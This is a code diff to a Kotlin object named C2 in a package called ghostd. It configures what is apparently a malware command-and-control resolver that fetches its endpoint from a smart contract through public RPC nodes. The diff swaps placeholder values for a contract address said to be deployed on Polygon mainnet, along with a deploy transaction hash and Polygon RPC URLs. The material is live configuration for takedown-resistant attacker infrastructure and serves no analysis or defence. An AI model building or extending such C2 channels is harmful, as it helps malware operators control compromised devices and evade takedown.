@@ -7,16 +7,17 @@ package com.tg.ghostd
  * EVM contract via `eth_call` (function `endpoint() view returns (string)`).
  * Only the contract address and the public RPC list are baked in.
  *
- * Values below are PLACEHOLDERS — replace when the contract is deployed.
+ * Deployed 2026-10-25 on Polygon mainnet by the owner's wallet
+ * (deploy tx 0x98b624368a1d24059144cec029f7dc2aee2e663abed6926a6377e68f8b48d038).
  */
 object C2 {
-    const val CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000001"
+    const val CONTRACT_ADDRESS = "0x7428945335ac4147369c48bb95d573ab5198e8af"
 
     val RPC_URLS = listOf(
-        "https://ethereum-rpc.publicnode.com",
-        "https://eth.llamarpc.com",
-        "https://rpc.ankr.com/eth",
-        "https://cloudflare-eth.com"
+        "https://polygon.publicnode.com",
+        "https://polygon.drpc.org",
+        "https://polygon-mainnet.gateway.tatum.io",
+        "https://1rpc.io/matic"
     )
 
     /** keccak256("endpoint()")[0..3] = 5e280f11 */
